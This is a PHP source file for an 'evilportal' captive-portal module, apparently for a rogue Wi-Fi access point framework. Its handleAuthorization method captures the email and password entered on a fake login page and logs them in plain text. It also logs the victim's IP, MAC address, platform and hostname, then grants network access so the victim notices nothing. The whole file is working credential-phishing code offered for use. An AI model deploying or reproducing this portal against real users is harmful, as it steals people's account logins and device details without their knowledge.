<?php

namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        // Check if destination is set in the request
        $target = $this->request->destination;

        // Log the form data
        if (isset($this->request->email) && isset($this->request->password)) {
            $email = $this->request->email;
            $password = $this->request->password;
            $mac = $this->request->mac ?? 'Unknown';
            $platform = $this->request->platform ?? 'Unknown';
            $hostname = $this->request->hostname ?? 'Unknown';
            $ip = $this->request->ip ?? $_SERVER['REMOTE_ADDR'];

            $this->writeLog("\nClient IP: {$ip}");
            $this->writeLog("MAC Address: {$mac}");
            $this->writeLog("Platform: {$platform}");
            $this->writeLog("Hostname: {$hostname}");
            $this->writeLog("Email: {$email}");
            $this->writeLog("Password: {$password}");
        }

        // Authorize the client
        $this->authorizeClient($_SERVER['REMOTE_ADDR']);

        // Check if the client is authorized
        if ($this->isClientAuthorized($_SERVER['REMOTE_ADDR'])) {
            $this->onSuccess();
        } else {
            $this->showError();
        }
    }

    public function onSuccess()
    {
        echo "Success";;
        exit();  // Ensure no further code is executed after displaying the message
    }

    public function showError()
    {
        echo "Error";
        exit();
        // parent::showError();
    }

    protected function redirect($url)
    {
        header("Location: {$url}", true, 302);
        exit();  // Ensure no further code is executed after redirection
    }
}
